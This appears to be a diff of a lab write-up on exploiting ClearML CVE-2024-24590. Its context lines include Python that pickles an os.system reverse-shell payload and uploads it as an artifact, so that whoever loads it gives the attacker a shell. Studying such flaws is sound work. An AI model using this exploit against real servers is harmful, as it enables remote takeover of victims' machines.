@@ -35,8 +35,7 @@ I found a website that details the vulnerabilities.
 [CVE-2024-24590](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/?source=post_page-----203ea31df0e3--------------------------------) 
 
 
-# Exploitation configuration:
-
+# Exploitation configuration
 
 According to what they explain, an attacker could create a pickle file containing arbitrary code and upload it as an artifact to a project via the API. When a user calls the get method within the Artifact class to download and load a file into memory, the pickle file is deserialized to their system and executes any arbitrary code it contains.
 
@@ -57,10 +56,7 @@ import pickle
 import os
 from clearml import Task, Logger
 
-
 task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])
-
-
 
 class MaliciousCode:
     def __reduce__(self):
@@ -70,7 +66,6 @@ class MaliciousCode:
         )
         return (os.system, (cmd,))
 
-
 malicious_object = MaliciousCode()
 pickle_filename = 'malicious_pickle.pkl'
 with open(pickle_filename, 'wb') as f:
@@ -78,11 +73,11 @@ with open(pickle_filename, 'wb') as f:
 
 print("Malicious pickle file with reverse shell created.")
 
-
 task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")
 
 print("Malicious pickle file uploaded as artifact.")
 ```
+
 With the execution of the exploit, the artifact is loaded.
 Then when the administrator checks it, you will get a shell on the listening port.
 
